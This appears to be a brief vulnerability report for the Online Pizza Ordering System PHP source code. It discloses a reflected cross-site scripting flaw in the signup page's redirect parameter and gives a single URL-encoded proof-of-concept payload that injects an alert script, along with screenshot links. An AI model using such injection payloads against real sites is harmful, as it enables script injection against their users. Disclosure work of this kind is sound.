vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $redirect

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220947178-a3811c14-ae9f-49e9-af13-48f6b8530e2b.png)


exp

```
http://192.168.31.50/php-opos/signup.php?redirect=%27%3E%3C/script%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
```
![image](https://user-images.githubusercontent.com/30823782/220947211-d845cfbe-7692-4ab8-92f3-1ecbacc6cdeb.png)

